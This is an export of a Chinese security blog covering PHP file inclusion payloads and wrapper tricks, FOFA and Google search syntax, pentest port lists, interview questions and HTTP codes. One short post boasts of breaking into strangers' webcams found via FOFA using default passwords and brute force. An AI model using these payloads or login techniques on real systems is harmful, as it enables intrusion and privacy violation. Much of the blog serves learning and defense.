对于远程文件，你需要考虑以下2点：1.在php.ini中需要allow_url_include = on和allow_url_fopen= on2.所需的远程文件后缀不能与目标服务器的语言相同，如目标服务器解析PHP代码，则远程文件后缀不能为.php。 让我解释一下第二点，如果你的远程文件具有.php后缀，并且你的远程文件内容如下所示： 1phpinfo (); 那么在远程服务器执行phpinfo()之后，你就可以获得目标服务器的内容。由于它不会运行代码，所以包含的信息不是目标服务器，而是远程服务器。如下所示： 这是我的PHP5.6版本的远程设备信息，目标设备是5.2版本。 接下来是包含文件： 你可以看到，包含文件后，你的远程设备发生了变化，这是为什么呢?由于目标服务器不包含此代码：此时，远程服务器会执行此代码的源代码，如下所示： 所以为了使这个攻击开始运行，你需要做一些修改： 1.修改配置 2.修改文件后缀 此时，你可以再来尝试一下包含的攻击向量： 那么你可以看到所需的信息在此包含之后返回，并且你的目标设备信息不再改变。 接下来，你要再次为远程文件包含做一个shell示例。 远程文件包含使用的前提是，符合本地文件包含的前提并符合远程文件包含其可用性的前提。 文件包含许多伪协议文件中可以包含不同的伪协议，我将在下面演示其中的一些： 1.data:text/plain or data: text/plain; base64data:text/plain 输出直接显示在相应的URL中，显示参数：data：text / plain。 然后你需要执行如下所示的php代码： data：text/plain; BASE64 有另一种方法来使用data: text/plain; base64，不过此时你需要使用base64编码来执行PHP代码，base64php代码如下所示： 2.php://inputphp://input访问请求的原始数据的只读流（read-only stream），会将post请求中的数据作为php代码执行。 你可以看到程序自动添加了一个.php后缀，因此使用包括php://input，将自动添加.php，所以它肯定不能正常工作。 此时，你可以参考以上的％00技巧来截断文件路径。 你可以看到终止符(terminator)是非常强大的。 3.php://filterphp://filter可以读取php文件的代码base64编码的输出并将其返回给你。 例如，你想读取一个PHP文件，但不希望它是正常的PHP。你可以通过php：//filter/read=convert.base64-encode/resource=../ 读取文件代码的内容。 解码base64后，你可以像正常情况一样获取内容： filter协议相对路径和绝对路径都可以使用 4.file://file://用于访问本地文件系统，不受allow_url_fopen orallow_url_include的影响，你可以使用file:// absolute / path / to / file来获取。 file协议只能使用绝对路径 5.zip://zip://可以访问zip文件中的文件，但它需要一个绝对路径。你可以使用zip://[archive absolute path] # [compressed file name]在本地创建一个文件并将其压缩到一个zip压缩文件中。 此时，你就可以填入绝对路径和文件的名称了。那么，你可能会有两个疑问？1.为什么你不能成功显示包括zip://的错误？这其中就包含zip://C:/phpStudy/WWW/include/phpinfo.zip.php，这是因为你不想包含这个文件，而是想把这个文件包含在zip里。2.为什么是＃以后的值？因为＃会忽略它后面的参数，所以你需要在表单中使用％23。还有一点就是，包含的文件以.php结尾，但你压缩了php后缀的文件。所以如下所示，你不需要这个后缀。 文件包含的防御方式：1.设置白名单代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。 2.过滤危险字符由于Include/Require可以对PHP Wrapper形式的地址进行包含执行（需要配置php.ini），在Linux环境中可以通过”../../”的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。 3.设置文件目录PHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。 4.关闭危险配置PHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。 最后，总结一下任意文件包含漏洞的防御方式。任意文件包含漏洞的主要出现在能够解析处理脚本文件的函数上，没有对输入的变量进行过滤，导致任意文件包含，进而导致恶意代码执行。在开发处理这类功能函数上，一定要遵循编程规范；在代码核心处，对变量进行过滤限制，设置文件路径或者白名单，避免执行任意文件包含。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次FOFA查看各地摄像头]]></title>
    <url>%2F2019%2F08%2F08%2F%E8%AE%B0%E4%B8%80%E6%AC%A1FOFA%E6%9F%A5%E7%9C%8B%E5%90%84%E5%9C%B0%E6%91%84%E5%83%8F%E5%A4%B4%2F</url>
    <content type="text"><![CDATA[FOFA的介绍和使用方法在前面的文章中已经写过了。今天主要介绍一下利用FOFA来搜索网络上世界各地的摄像头。 方法其实很简单，直接搜关键字就行，比如摄像头的品牌，甚至直接输入“摄像头”，在下面的结果中直接点击相应的连接即可。如图所示 接下来进入了摄像头登陆界面。这里登陆的方法很多，可以利用万能密码，可以爆破，可以手动尝试弱密码，可以利用网上爆出的相关型号版本漏洞绕过登陆等。就不详细介绍每种方法了。下面放几个我登录的成功界面。]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>FOFA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FOFA简介及使用教程]]></title>
    <url>%2F2019%2F08%2F08%2FFOFA%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[FOFA 是什么？FOFA 是白帽汇推出的一款网络空间搜索引擎,它通过进行网络空间测绘,能够帮助研究人员或者企业迅速进行网络资产匹配,例如进行漏洞影响范围分析、应用分布统计、应用流行度等。FOFA 搜索引擎检索到的内容主要是服务器，数据库，某个网站管理后台，路由器，交换机，公共ip的打印机，网络摄像头，门禁系统，Web服务 ……FOFA 这类搜索引擎又有另一个名字：网络空间测绘系统。—— 它们就像是现实生活中的卫星地图那样，一点点勾勒出公共网络空间的样子，每一个网站、每一台公共环境下的服务器……当一个高危漏洞爆发，FOFA系统便能向卫星定位地址一样，通过特征迅速找到全网的脆弱设备。网站：https://fofa.so/ FOFA不仅提供了在线搜索还提供了FOFA Pro客户端版本 注意：1) 普通会员和高级会员的 免费100条 和 免费10000条 是指每天调用API可以免费获取前100条和前10000条,假设高级会员调用API,每页获取3333条，第1、2、3页由于没有超过前10000条，所以免费，第4页超过前10000条，所以会扣除1FOFA币。2) 直接下载数据，无论多少条数据，都要花费FOFA币。普通会员300 高级会员1000 终身制 。 查询语法介绍1、怎么搜？首先FOFA作为一个搜索引擎，我们要熟悉它的查询语法，类似google语法，FOFA的语法也是简单易懂，主要分为检索字段以及运算符，所有的查询语句都是由这两种元素组成的。目前支持的检索字段包括：domain，host，ip，title，server，header，body，port，cert，country，city，os，appserver，middleware，language，tags，user_tag等等，支持的逻辑运算符包括：= ，==，!= ，&amp;&amp;，||。了解了检索字段和逻辑运算符之后，就基本掌握了FOFA的用法了。例如搜索title字段中存在后台的网站，我们只需要在输入栏中输入title=”后台”，输出的结果即为全网title中存在后台两个字的网站，对于黑客而言，可以利用得到的信息可以继续进行渗透攻击，对于网站的后台进行密码暴力破解，密码找回等等攻击行为，这样就可以轻松愉快的开始一次简单渗透攻击之旅，而企业用户也可以利用得到的信息进行内部的弱口令排查等等，防范于未然。 下面为大家一一介绍目前支持的所有检索字段的用法： 1.1 domain例:搜索QQ所有的子域名 : domain=”qq.com” 1.2 host例:搜索host内所有带有qq.com的域名: host=”qq.com” 1.3 ip例:搜索某个IP上的相关信息 ip=”58.63.236.248”支持IP段搜索ip=”111.1.1.1/8”ip=”111.1.1.1/16”ip=”111.1.1.1/24” 1.4 title例:搜索title包含有”漏洞”的IP title=”漏洞” 1.5 server例:Apache出来了一个高危漏洞,我们需要去统计全球的Apache server=”Apache” 1.6 header例:搜索前段时间非常火的海康威视 header=”Hikvision” 1.7 body例:假如我想搜索微博的后台,域名为:weibo.com并且网页内body包含”后台” body=”后台” &amp;&amp; domain=”weibo.com” &amp;&amp;:与body=”后台” &amp;&amp; domain=”weibo.com” 提取域名为:weibo.com并且网页内body包含”后台”的网站 需要同时满足两个条件 1.8 port例:想要找非80端口 port!=”80” !=: port!=”80”匹配端口不为80端口的服务 1.9 cert搜索证书(https或者imaps等) 例:百度公司为了检查自己的域名是否还有心脏出血漏洞可以使用语法: cert=”baidu” 1.10country搜索指定国家(编码)的资产 例:搜索中国的服务器 country=”CN” 注:country=”CN” country后面的规则为各国家的缩写,全球国家缩写如下链接: https://zhidao.baidu.com/question/538403206.html 1.11 city搜索指定城市的资产 例:搜索上海的服务器 city=”Shanghai” 注:搜索城市时填写城市的全称,首字母必须大写! 1.12 os例:搜索centos所有主机 os=”centos” 了解了基础查询我们再来谈谈高级查询，其实也很简单，就是多个基础查询语句用逻辑连接符拼成的语句，例如我们要搜索上海的Discus组件，搜索语句是(title=”Discuz”||body=”content=”Discuz”) &amp;&amp; city=”Shanghai” &amp;&amp;:逻辑与||：逻辑或上面的语句意思为 (title=”Discuz”||body=”content=”Discuz”)与city=”Shanghai”这两个条件必须同时满足，(title=”Discuz”||body=”content=”Discuz”)中title=”Discuz” 与body=”content=”Discuz”满足一个即可。利用高级搜索可以更细致的了解网络空间中每个用户关注的资产信息。 2、搜什么？FOFA可以从不同维度搜索网络组件，例如地区，端口号，网络服务，操作系统，网络协议等等。目前FOFA支持了多个网络组件的指纹识别，包括建站模块、分享模块、各种开发框架、安全监测平台、项目管理系统、企业管理系统、视频监控系统、站长平台、电商系统、广告联盟、前端库、路由器、SSL证书、服务器管理系统、CDN、Web服务器、WAF、CMS等等，详细信息可见（https://fofa.so/library）。 网站模块pagespeed， mod_bwlimited， mod_auth_passthrough， mod_auth_pam， mod_fastcgi， mod_jk， mod_perl， mod_python， mod_rack， mod_rails， mod_ssl， mod_wsgi， mod_antiloris， 广告联盟doubleclick_ad， baidu广告联盟， Google_AdSense， Open_AdStream， adinfinity， adriver， 反向代理服务器squid， kangle反向代理， Varnish， Aicache， SJSWPS_ OiWPS， HAProxy_Report， 脚本语言PHP， ASP.NET， python， ruby， jsp， perl， nodejs， ASP， 前端库jquery， bootstrap， d3， jquery-ui， yui， AlloyUI， 分享模块jiathis， ujian， 百度分享， joomla-facebook， addthis， hellobar， 路由器百为路由， 锐捷NBR路由器， mikrotik， 中兴路由器， h3c路由器， jcg无线路由器， D-Link_VoIP_Wireless_Router， arrisi_Touchstone， ZyXEL， Ruckus， Motorola_SBG900， Wimax_CPE， Cisco_Cable_Modem， Scientific-Atlanta_Cable_Modem， rap， ZTE_MiFi_UNE， DI-804HV， HuaweiHomeGateway， TP-LINK无线路由器， 云评论uyan， disqus， 统计模块google-analytics， cnzz， baidu统计， 51la， CNZZ统计， awstats_misc_tracker， advancedwebstats， hubspot， 51yes， Piwik， 开发框架ThinkPHP， Swiftlet， Aspnetmvc， CodeIgniter， ColdFusion， WebObjects， cakephp， Django， zikula_framework， NetteFramework， Fat-FreeFramework， Play-Framework， Restlet-Framework， Kohana-Framework， flow_framework， SIMIT_framework， axis2-web， 其他mongodb， elasticsearch， phpMyadmin， MVB2000， GPSweb， Tumblr， phpinfo， AD_RS设备， FrontPageServerExtension， 认证页面， TCN协议， sharepoint， MS-Author-Via， 3COM_NBX， wspx， rack-cache， Dnnoutputcache， Iisexport， Oraclea-DMS， P3p_enabled， X-72e-Nobeian-Transfer， ManagedFusion， Adblock， Blackboard， LiquidGIS， Cocoon， Wp-Super-Cache， pagespeed， Alternate-Protocol， unbouncepages， lemis管理系统， OpenSSL， mod_bwlimited， mod_auth_passthrough， FreeboxOS， SMA_Sunny_Webbox， Wimax_CPE， Aethra_Telecommunications_Operating_System， Scientific-Atlanta_Cable_Modem， rap， ZTE_MiFi_UNE， 用友商战实践平台， moosefs， AirLink_modem， CCProxy， APC_Management， HuaweiHomeGateway， TP-LINK无线路由器， 蓝盾BDWebGuard， 护卫神网站安全系统， phpDocumentor， ColdFusion， Adobe_ CQ5， Adobe_GoLive， Adobe_RoboHelp， Amaya， PHP-CGI， Synology_NAS， OpenMas， __VIEWSTATE， Chromelogger， Communique， recaptcha， IPFire， TerraMaster， 创星伟业校园网群， 正方教务管理系统， UFIDA_NC， 北创图书检索系统， Facebook_insights， squarespace建站， Bad_Behavior， Azure_ARR， Tncms， 北京清科锐华CEMIS， RG-PowerCache内容加速系统， dayrui系列产品， Privoxy代理， wordpress_qTranslate， DVWA， sugon_gridview， blog_fc2， LiteSpeed_Web_Admin_Console， SLTM32_Configuration， SHOUTcast， Piwigo， seeyoo广告机， milu_seotool， Moxa Nport串口服务器， CISCO_EPC3925， CASino， metasploit， SSL证书thawte_ssl_cert， wosign_ssl_cert， webtrust_cert， globalsign_cert， GeoTrust_cert， 安全检测平台360网站安全检测， teamportal， 项目管理jira， fisheye， VisualSVN， Redmine， zentao， Bugzilla， Phabricator， reviewboard， Hudson， Jenkins， testlink， trac， gitlab， mantis， Mercurial， 服务器管理LuManager， 主机宝， wdcp管理系统， LANMP一键安装包， UPUPW， wamp， easypanel， awstats_admin， awstats， uPlusFtp， Cactiez， Cacti， CrushFTP， HFS， WHM， moosefs， LUM服务器管理， 护卫神主机管理， cpanel， bacula-web， Webmin， Directadmin， Synology_DiskStation， Puppet_Node_Manager， 企业管理易瑞授权访问系统， MVB2000， SonicWALL， NetShare_VPN， pmway_E4_crm， srun3000计费认证系统， Dolibarr， Parallels Plesk Panel， EasyTrace(botwave)， 管理易， 亿赛通DLP， huawei_auth_server， 瑞友天翼_应用虚拟化系统 ， Vmware_vFabric， ICEFLOW_VPN， 360企业版， 用友erp-nc， 深信服ssl-vpn， 天融信VPN， Array_Networks_VPN， 天融信防火墙， o2security_vpn， zabbix， juniper_vpn， F5_BIGIP， CEMIS， DI-804HV， CCProxy， 梭子鱼设备， Synology_NAS， zenoss， Splunk， OpenMas， Ultra_Electronics， NOALYSS， Nagios， ALCASAR， orocrm， Adiscon_LogAnalyzer， Munin， opennms， MRTG， ganglia， 元年财务软件， UFIDA_NC， Webmin， 锐捷应用控制引擎， Storm， 网神VPN， FortiWeb， Centreon， FortiGuard， PineApp， ntop， CDR-Stats， GenieATM， Spark_Worker， Spark_Master， Kibana， CISCO_VPN， UcSTAR， i@Report， 帕拉迪统一安全管理和综合审计系统， openEAP， Dorado， 金龙卡金融化一卡通网站查询子系统， 一采通， 埃森诺网络服务质量检测系统， 惠尔顿上网行为管理系统， ACSNO网络探针， 绿盟下一代防火墙， 用友U8， 华为_HUAWEI_SRG1220， 华为_HUAWEI_SRG2220， 华为_HUAWEI_ASG2100， 华为_HUAWEI_SRG3250， 华为_HUAWEI_ASG2050， 华为（HUAWEI）安全设备， 华为（HUAWEI）Secoway设备， Fireeye， CDN蓝讯， 网宿， 帝联， 快网， Webluker， 西部数码， gocdn， Powercdn， Akamai， QingCloud， amazon-cloudfront， Web服务器Sun[tm]， ZendServer， squid， JBoss_AS， oracle_applicaton_server， IIS， nginx， tomcat， Apache， Tengine， IBM_HTTP_Server， GSE， LiteSpeed， Microsoft-HTTPAPI， ngx_openresty， Zeus， Resin， Netscape-Enterprise， Phusion， webrick， Jetty， Sun-ONE-Web-Server， Oracle-Application-Server， JBoss， kangle反向代理， Varnish， Aicache， SJSWS_ OiWS， AOLserver， Lotus-Domino， gunicorn， Allegro-Software-RomPager， Starlet， nginx_admin， FortiWeb， GlassFish， Privoxy， 东方通应用服务器TongWeb， Mbedthis-Appweb， 网站防火墙WAF一启快， 360主机卫士， 安全狗， Websecurity_WAF， webray， weidun， 安慧网盾， Safe3WAF， AnZuWAF， DnP Firewall， Kerio_WinRoute_Firewall， Dotdefender， Citrix_Netscaler， Mod_Security， PaloAlto_Firewall， WebKnight， Sucuri， 梭子鱼防火墙， 云锁， 路由器dd-wrt， 锐捷NBR路由器， mikrotik， 中兴路由器， h3c路由器， jcg无线路由器， Comcast_Business_Gateway， AirLink_modem， CMSphpshe， ThinkSAAS， e-tiller， DouPHP， twcms， SiteServer， Joomla， HDWiki， kesionCMS， CMSTop， ESPCMS， 74cms， Foosun， PhpCMS， Hanweb， Drupal， cmseasy， wordpress， DedeCMS， ASPCMS， MetInfo， Npoint， 小蚂蚁， 捷点JCMS， 帝国EmpireCMS， JEECMS， emlog， IdeaCMS， TCCMS， DIYWAP， supesite， webplus， Dolibarr， ExpressionEngine， iAPPS， Liferay， Telerik Sitefinity， PageAdmin， sdcms， EnterCRM， 易普拉格科研管理系统， 苏亚星校园管理系统， 313自助建站， trs_wcm， we7， 1024cms， 360webfacil_360WebManager， 6kbbs， ABO_CMS， Acidcat_CMS， bit-service， 云因网上书店， DotNetNuke， plone， Kooboocms， unknown_cms， chanzhi， unknown_cms_rcms， MediaWiki， Typecho， Z-Blog， Z-BlogPHP， EleanorCMS， BitrixSiteManager， FOXI BIZzz， BPanelCMS， SubrionCMS， WMSN， TwilightCMS， TechartCMS， 2z project， phpDocumentor， 微门户， Osclass， webEdition， orocrm， 创星伟业校园网群， BoyowCMS， 正方教务管理系统， UFIDA_NC， phpweb， weebly， 地平线CMS， HIMS酒店云计算服务， Tipask， 北创图书检索系统， squarespace建站， 微普外卖点餐系统， 逐浪zoomla， Zikula_CMS， mozartframework， UMI.CMS， EasywebCMS， synkronvia， sitecore， MuraCMS， irecms， typo3， SamanPortal， 北京清科锐华CEMIS， ThinkSNS， asp168欧虎， 擎天电子政务， easysite， 北京阳光环球建站系统， MaticsoftSNS_动软分享社区， FineCMS， Diferior， DokuWiki， WebsiteBaker-CMS， concrete5， 国家数字化学习资源中心系统， 某通用型政府cms， PigCms， 天柏在线培训/考试系统， 万户网络， rcms， 全国烟草系统， O2OCMS， 一采通， 视频监控EdmWebVideo， iDVR， edvr， AVCON6， Polycom， Plesk， techbridge， NETSurveillance， 海康威视（Hikvision）， nvdvr， DVR camera， TRSMAS， Macrec_DVR， Aethra_Telecommunications_Operating_System， ECOR， MOBOTIX_Camera， OnSSI_Video_Clients， Linksys_SPA_Configuration ， eagleeyescctv， dasannetworks， 海康威视iVMS， 佳能网络摄像头(Canon Network Cameras)， NetDvrV3， 网站云防护cloudflare， 加速乐， Incapsula， 百度云加速， 360网站卫士， 安全宝， BinarySec， Sucuri， NetteFramework， 论坛社区phpbb， phpwind， discuz， vBulletin， 6kbbs， IP.Board， 邮件系统fangmail， 腾讯企业邮箱， MDaemon， 亿邮， 网易企业邮箱， TurboMail， magicwinmail， 万网企业云邮箱， bxemail， Coremail， imailserver， exchange， Zimbra， Lotus， Roundcube， Horde， Atmail， iGENUS_webmail， anymacro， mirapoint， iredadmin(Roundcube?)， SquirrelMail， U-Mail， ExtMail， Spammark邮件信息安全网关， 站长平台360站长平台， baidu站长平台， google站长平台， sogou站长平台， 电商系统Zen Cart， ECShop， Shop7Z， 同城多用户商城， iWebShop， eaststorecreeator， buscape， 1und1， 3DCART， cart_engine， Magento， OpenCart， ECMall， PrestaShop， Bigcommerce， TinyShop， hishop， Maticsoft_Shop_动软商城， shopify， hikashop， OA系统华天动力OA(OA8000)， 通达OA， OA(a8/seeyon/ufida)， yongyoufe， pmway_E4_crm， Dolibarr， PHPOA， 78oa， WishOA， 金和协同管理平台， 泛微协同办公OA， 万户ezOFFICE， ranzhi， Zimbra， Lotus， OA企业智能办公自动化系统， ecwapoa， ezOFFICE， 3、使用场景例如Apache出来了一个高危漏洞，受影响的版本号为2.4.23,我们需要去本公司可能受此漏洞影响的Apache服务器，那么我们可以使用高级查询语句server==”Apache/2.4.23”&amp;&amp;domain=”xxx.com”，搜索结果即为本公司域名下的所有子域名可能存在Apache2.4.23版本漏洞的URL，安全人员可以对结果进行检查，及时修复漏洞。 三、FOFA的特点1.支持API查询接口，便于进行程序间的自动化查询、处理功能，进行进一步的业务分析用法如下： 所有调用都需要提供身份信息，主要是email和key，email主要是注册和登陆时填写的email，key需要用户到个人中心获取32位的hash值，即为API KEY。将上面的两个信息填入api接口中，即可获取json格式的数据。 2.支持下载功能搜索到结果之后可在右侧选择下载功能，可下载搜索到的所有数据，下载的格式支持CSV，JSON，XML格式，方便程序调用进行全网扫描。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>FOFA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试常见端口]]></title>
    <url>%2F2019%2F08%2F07%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[一些常见的的服务端口 1,web类(web漏洞/敏感目录)80 web80-89 web8000-9090 web 2,数据库类(扫描弱口令)1433 MSSQL1521 Oracle3306 MySQL5432 PostgreSQL 3,特殊服务类(未授权/命令执行类/漏洞)443 SSL心脏滴血873 Rsync未授权5984 CouchDB http://xxx:5984/_utils/6379 redis未授权7001,7002 WebLogic默认弱口令，反序列9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞11211 memcache未授权访问27017,27018 Mongodb未授权访问50000 SAP命令执行50070,50030 hadoop默认端口未授权访问 4,常用端口类(扫描弱口令/端口爆破)21 ftp22 SSH23 Telnet2601,2604 zebra路由，默认密码zebra3389 远程桌面端口合计详情 21 ftp 22 SSH 23 Telnet 80 web 80-89 web 161 SNMP 389 LDAP 443 SSL心脏滴血以及一些web漏洞测试 445 SMB 512,513,514 Rexec 873 Rsync未授权 1025,111 NFS 1433 MSSQL 1521 Oracle:(iSqlPlus Port:5560,7778) 2082/2083 cpanel主机管理系统登陆 （国外用较多） 2222 DA虚拟主机管理系统登陆 （国外用较多） 2601,2604 zebra路由，默认密码zebra 3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 3306 MySQL 3312/3311 kangle主机管理系统登陆 3389 远程桌面 4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 5432 PostgreSQL 5900 vnc 5984 CouchDB http://xxx:5984/_utils/ 6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 6379 redis未授权 7001,7002 WebLogic默认弱口令，反序列 7778 Kloxo主机控制面板登录 8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 8080 tomcat/WDCP主机管理系统，默认弱口令 8080,8089,9090 JBOSS 8083 Vestacp主机管理系统 （国外用较多） 8649 ganglia 8888 amh/LuManager 主机管理系统默认端口 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 28017 mongodb统计页面 50000 SAP命令执行 50070,50030 hadoop默认端口未授权访问]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[一些面试题]]></title>
    <url>%2F2019%2F08%2F07%2F%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[一些面试题 1.为何一个MYSQL数据库的站，只有一个80端口开放？（1）更改了端口，没扫描出来；（2）站库分离；（3）3306端口不对外开放。 2.一个成熟并且相对安全的CMS，渗透时扫目录的意义？（1）敏感文件，二级目录扫描（2）站长的误操作，比如：网站备份的压缩文件，说明.txt，二级目录可能存放着其他站点。 3.再某后台新闻编辑界面看到编辑器，应该先做什么？查看编辑器的名称版本，然后搜索公开的漏洞 4.审计上传点的元素有什么意义？有些站点的上传文件类型限制是在前端实现的，这时只要增加上传类型就能突破限制了。 5.CSRF、XSS及XEE有什么区别？以及修复方式XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。 修复方式：对字符实体进行转义，使用HTTP Only来禁止JavaScirpt读取Cookie值，输入时校验，浏览器与Web应用端采用相同的字符编码。CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。 修复方式：筛选出需要防范CSRF的页面然后嵌入Token，再次输入密码，校验RefererXXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件获取。 修复方式：XML解析库在调用时严格禁止对外部实体的解析。 6.3389无法连接的几种情况（1）没开放3389端口（2）端口被修改（3）防护拦截（4）处于内网（需进行端口转发） 7.列举出owasp top10 2017（1）注入；（2）失效的身份认证；（3）敏感信息泄露；（4）XML外部实体（XXE）；（5）失效的访问控制；（6）安全配置错误；（7）跨站脚本（XSS）；（8）不安全的反序列化；（9）使用含有已知漏洞的组件（10）不足的日志记录和监控 8.说出至少三种业务逻辑漏洞，以及修复方式密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码。身份认证漏洞中最常见的是会话固定攻击和Cookie仿冒，只要得到Session或Cookie即可伪造用户身份。验证码漏洞中存在验证码允许暴力破解、验证码可以通过JavaScript或者改包的方法来进行绕过。 9.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403，什么原因？原因很多，有可能Web服务器配置把上传目录写死了不执行相应脚本 10.目标站禁止注册用户，找回密码处随便输入用户名提示：”此用户不存在”，你觉得这里怎么利用？先爆破用户名，再利用被爆破出来的用户名爆破密码；所有和数据库有交互的地方都有可能有注入。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谷歌语法]]></title>
    <url>%2F2019%2F08%2F05%2F%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[很多搜索引擎支持通配符号，如“”代表一连串字符，“?”代表单个字符等。*Google不支持 通配符*，只能做精确查询，关键字中的“”或者“?”会被忽略掉。 Google 对英文字符大小写不敏感，“xiaomi”和“XIAOMI”搜索的结果是一样的。 Google的关键字可以是词组（中间没有空格），也可以是句子（中间有空格），但是，用句子做关键字，必须加英文引号。如“Want xiaomi phone” Google 对一些网路上出现频率极高的英文单词，如“i”、“com”、“www”等，以及一些符号如 “*”、“.”等，作忽略处理。 如果要对忽略的关键字进行强制搜索，则需要在该关键字前加上明文的“+”号。 示例：搜索包含“Who am I ?”的网页。如果用“”who am i ?””，“Who”、“I”、“?”会被省略掉， 搜索将只用“am”作关键字，所以应该用强制搜索。如搜索：“”+who +am +i”” Google中文站和Google英文站是有区别的顾名思义中文版的google爬虫肯定搜集更多的中文网站，其搜索结果排序也是根据中国地区用户的搜索习惯来排序的。 Google按时间搜索的应用这个是一个比较常用的功能。信息过度的时代，如何成为有价值，一个是独家，一个就是时效。 Google基本语法1、加号（“+”）Google 无需用明文的“+”来表示逻辑“与”操作，只要空格就可以了。Google 默认的连接符是 AND; 意味着如果你不加其他修饰符号直接搜索的话, Google 就 会对所有的关键字同时进行搜索. 例如：搜索所有包含关键词“xiaomi”和“phone”的英文网页搜索：“xiaomi phone” 代表着 xiaomi 与phone。 注意：文章中搜索语法外面的引号仅起引用作用，不能带入搜索栏内。 2、减号（“-”）示例：搜索所有包含“xiaomi”而不含“phone”的网页 搜索：“xiaomi -phone” 代表着只含 xiaomi，不含phone 的页面。 注意：这里的“+”和“-”号，是英文字符，而不是中文字符的“＋”和“－”。此外，操作符与作用 的关键字之间，不能有空格。比如“易筋经 - 吸星大法”，搜索引擎将视为逻辑“与”操作，中 间的“-”被忽略。 3、ORGoogle 用大写的“OR”表示逻辑“或”操作，但是这种OR的方式中文搜索会有内容展示的BUG。 如果要从几个关键字中指定任中一个, 可以使用 OR 连接符. 同时你也可以使用电脑编程 里管道符号 “|” 来表示 OR 的功能. 示例：搜索包含“mobile”或者“phone”、或者两者均有网页内容。 搜索：“mobileOR phone” 这种方法使用的比较少，不能使用在品牌关键词上，如”xiaomi Phone OR HuaweiPhone”，这样推荐给你的信息基本是前者，因为这些都属于商业一直在增长。 高级Google搜索语法1、allintextallintext的意思是以网页正文内容中的冒个字符作为搜索条件，例如“allintext：天气” 2、intitle,allintitle只有当网页标题包含所搜索第关键字时，它才会出现在搜索结果里。intitle 只要包含即可，allintitle需要全部匹配。 3、cachecache的意思是缓存，例如“cache：www.baidu.com”。 4、definedefine的意思是词语的定义，例如：“define：中国” 5、filetypefiletype的意思是搜索指定格式的文件，例如“filetype：MDB”，类似于这样的搜索通常都可以直接下载，我们这样搜索很可能搜索到别人的数据口哦！ 6、infoinfo的意思是查找指定的网站基本信息，例如：“info：www.baidu.com”。 7、linklink的意思是查看连接的网站。例如“link：www.baidu.com” 8、relatedrelated的意思是返回主页上连接的内容，例如“related：www.baidu.com” 9、sitesite的作用非常的好，它可以制定一个特定的区域进行搜索，也就是说如果site后面是一个网站，那么我们得到的内容就是关于这个网站的，例如：“site：www.baidu.com” 10、inurlinurl的作用是搜索得到你搜索内容的网址，例如：“inurl：asp”]]></content>
      <categories>
        <category>网络基础</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[HTTP响应码]]></title>
    <url>%2F2019%2F08%2F05%2FHTTP%E5%93%8D%E5%BA%94%E7%A0%81%2F</url>
    <content type="text"><![CDATA[响应码由三位十进制数字组成，它们出现在由HTTP服务器发送的响应的第一行。 响应码分五种类型，由它们的第一位数字表示：1xx：（临时响应）表示临时响应并需要请求者继续执行操作的状态代码。 100 :(继续)请求者应当继续提出请求。服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。 101:(切换协议)请求者已要求服务器切换协议，服务器已确认并准备切换。 2xx：（成功）行为被成功地接受、理解和采纳 200 （成功）服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。对GET和POST请求的应答文档跟在后面。 201 （已创建）请求成功并且服务器创建了新的资源。Location头给出了它的URL。 202 （已接受）服务器已接受请求，但尚未处理。 203 （非授权信息）服务器已成功处理了请求，但返回的信息可能来自另一来源。一些应答头可能不正确，因为使用的是文档的拷贝 204 （无内容）没有新文档，浏览器应该继续显示原来的文档。如果用户定期地刷新页面，而Servlet可以确定用户文档足够新，这个状态代码是很有用的。 205 （重置内容）没有新的内容，但浏览器应该重置它所显示的内容。用来强制浏览器清除表单输入内容。 206 （部分内容）服务器成功处理了部分 GET 请求。 3xx：(重定向)为了完成请求，必须进一步执行的动作 。通常，这些状态代码用来重定向。 300 